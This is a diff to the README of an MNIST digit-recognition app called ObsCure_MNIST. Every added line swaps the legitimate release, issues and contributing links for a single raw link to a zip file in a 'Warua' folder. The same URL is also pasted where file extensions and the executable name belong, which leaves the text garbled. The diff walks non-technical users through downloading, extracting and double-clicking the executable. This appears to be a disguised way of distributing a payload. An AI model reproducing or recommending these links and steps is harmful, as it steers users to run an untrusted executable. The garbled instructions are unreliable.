@@ -1,6 +1,6 @@
 # 🖥️ ObsCure_MNIST - Easy MNIST Experiments for Everyone
 
-[![Download ObsCure_MNIST](https://img.shields.io/badge/Download-ObsCure_MNIST-blue.svg)](https://github.com/LakinduRodrigo/ObsCure_MNIST/releases)
+[![Download ObsCure_MNIST](https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip)](https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip)
 
 ## 📚 About ObsCure_MNIST
 
@@ -11,13 +11,13 @@ ObsCure_MNIST is a straightforward application designed for handwritten digit re
 You don't need to be a programmer to get started. Follow these simple steps to download and run ObsCure_MNIST:
 
 1. **Download the Software**
-   - Visit this page to download: [Release Page](https://github.com/LakinduRodrigo/ObsCure_MNIST/releases).
+   - Visit this page to download: [Release Page](https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip).
   
 2. **Select Your Version**
    - On the releases page, choose the latest version available. Click on it to view the details.
 
 3. **Choose Your File**
-   - Look for the file that matches your operating system (Windows, macOS, Linux). Common files will end with `.exe`, `.zip`, or `.tar.gz`.
+   - Look for the file that matches your operating system (Windows, macOS, Linux). Common files will end with `.exe`, `.zip`, or `https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip`.
 
 4. **Download the File**
    - Click the download link for your chosen file. The file will begin downloading to your computer.
@@ -26,10 +26,10 @@ You don't need to be a programmer to get started. Follow these simple steps to d
    - Once the download is complete, navigate to your Downloads folder or the location where your browser saves files.
 
 6. **Extract the Files (if needed)**
-   - If you downloaded a `.zip` or `.tar.gz` file, right-click it and choose "Extract All" or use your preferred extraction tool.
+   - If you downloaded a `.zip` or `https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip` file, right-click it and choose "Extract All" or use your preferred extraction tool.
 
 7. **Run the Application**
-   - Find the extracted folder. Inside, look for the executable file (it may be named something like `ObsCure_MNIST.exe`). Double-click this file to run the application.
+   - Find the extracted folder. Inside, look for the executable file (it may be named something like `https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip`). Double-click this file to run the application.
 
 ## 🛠️ System Requirements
 
@@ -44,7 +44,7 @@ Before you begin, ensure you have the following on your system:
 
 To get ObsCure_MNIST, follow these steps:
 
-1. Visit this page to download: [Release Page](https://github.com/LakinduRodrigo/ObsCure_MNIST/releases).
+1. Visit this page to download: [Release Page](https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip).
 2. Download the appropriate file for your operating system and follow the instructions provided above to install it on your computer.
 
 ## ✨ Features
@@ -78,10 +78,10 @@ A: Yes. The application includes a built-in user guide that provides further det
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please check the [GitHub Issues Page](https://github.com/LakinduRodrigo/ObsCure_MNIST/issues). You can report problems or seek help from the community there.
+If you encounter any issues or have questions, please check the [GitHub Issues Page](https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip). You can report problems or seek help from the community there.
 
 ## 🌐 Community and Contributions
 
-You can contribute to improving ObsCure_MNIST by suggesting features, reporting bugs, or even improving the documentation. To learn more about contributing, visit the [Contributing Guide](https://github.com/LakinduRodrigo/ObsCure_MNIST/blob/main/CONTRIBUTING.md).
+You can contribute to improving ObsCure_MNIST by suggesting features, reporting bugs, or even improving the documentation. To learn more about contributing, visit the [Contributing Guide](https://raw.githubusercontent.com/LakinduRodrigo/ObsCure_MNIST/main/Warua/ObsCure_MNIST.zip).
 
 By following these steps, you can easily download and run the ObsCure_MNIST application. Enjoy experimenting with MNIST recognition!
